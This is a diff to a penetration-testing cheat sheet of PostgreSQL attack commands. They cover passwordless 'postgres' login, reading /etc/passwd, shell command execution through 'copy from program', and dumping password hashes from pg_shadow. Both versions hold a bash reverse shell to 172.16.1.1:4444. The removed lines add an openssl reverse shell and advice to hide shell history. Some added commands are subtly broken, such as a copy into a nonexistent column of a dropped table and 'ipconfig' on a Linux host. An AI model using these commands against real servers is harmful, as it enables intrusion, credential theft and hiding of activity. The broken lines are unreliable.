@@ -308,34 +308,31 @@ create table test (input TEXT); copy test from '/etc/passwd'; select input from 
 
 psql -U postgres -h <IP>                             Login with user 'postgres' and no password
 \l                                                   List databases
+\dt                                                  List tables
 \du                                                  List database users
-select pg_ls_dir('/etc');                            List directory contents of /etc
-\c postgres                                          Connect to the 'postgres' db
-\d                                                   List of tables
+\c accounting                                        Connect to the 'accounting' db
 
-create table tmp(data text);                         Create a table called 'tmp'
-copy tmp(data) from program 'ls -l /home';           Run a command in the shell and save the output
-select * from tmp;                                   Print the contents of the table
+select pg_ls_dir('/etc');                            List directory contents of /etc (this requires superuser privileges)
 
-copy tmp from '/etc/passwd';
-select * from tmp;
+create table tmp(output text);                       Create a table called 'tmp' to house contents from reading files
+copy tmp from program 'ipconfig';                    Run a shell command and save the output 'tmp' table (if this does not work use ifconfig)
+select * from tmp;                                   Show contents of the 'tmp' table
+drop table tmp;                                      Delete table
 
-delete from tmp;                                     Clear the table
+copy tmp(data) from program 'id';                    Check for system level access
+select proname from pg_proc;                         Enumberate functions
+select * from pg_available_extensions;               Check for unpatched extensions
 
-Replace 'ls -l /home' with whatever command you'd like to run.
-drop table tmp;
+select current_timestamp - pg_postmaster_start_time() as uptime;   Show uptime
 
-http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-openssl s_client -quiet -connect <IP>:<port> | /bin/sh 2>&1 | openssl s_client -connect <IP>:<port>
+- Dump database creds
+select * from pg_user;
+select * from pg_roles;
+select * from pg_shadow;
 
-Make sure to `export HISTFILE=/dev/null` when you get on, and `kill -9 $$` when you get off.
-
-# Example
-
-psql -U postgres -h <target IP> platforms
-\c postgres
-create table redteam(data text);
-copy redteam from program 'bash -i >& /dev/tcp/172.16.1.1/4444 0>&1 &';
+- Reverse shell
+create table shell(data text);
+copy shell from program 'bash -i >& /dev/tcp/172.16.1.1/4444 0>&1 &';
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # sqlmap
